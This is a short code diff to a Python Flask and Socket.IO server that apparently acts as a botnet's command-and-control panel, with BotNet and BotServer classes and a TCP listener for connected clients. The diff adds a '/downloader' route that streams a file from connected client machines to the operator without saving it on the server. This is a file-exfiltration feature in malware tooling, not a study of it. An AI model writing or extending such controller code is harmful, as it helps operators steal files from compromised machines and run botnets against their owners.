@@ -1,6 +1,6 @@
 import os
 import socket
-from flask import Flask, render_template, session, request, Response
+from flask import Flask, render_template, session, request, Response, stream_with_context
 from flask_socketio import SocketIO, emit
 from functools import wraps
 import importlib
@@ -59,6 +59,12 @@ def upload_file():
         # TODO switch to in-progress instead of "success"
         return json.dumps({"success": True})
 
+@app.route('/downloader', methods=['GET'])
+def download_file():
+    filename = "example.txt"
+    # Steam the file from the client (don't save locally)
+    return Response(stream_with_context(botnet.startFileDownload(connected,filename)))
+
 def requires_auth(f):
     @wraps(f)
     def decorated(*args, **kwargs):
@@ -88,6 +94,7 @@ if __name__ == "__main__":
     TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     TCPSOCK.bind((HOST, PORT))
+
     botnet = BotNet(socketio)
     botserver = BotServer(TCPSOCK, botnet, socketio, CLIENT_FILE)
 
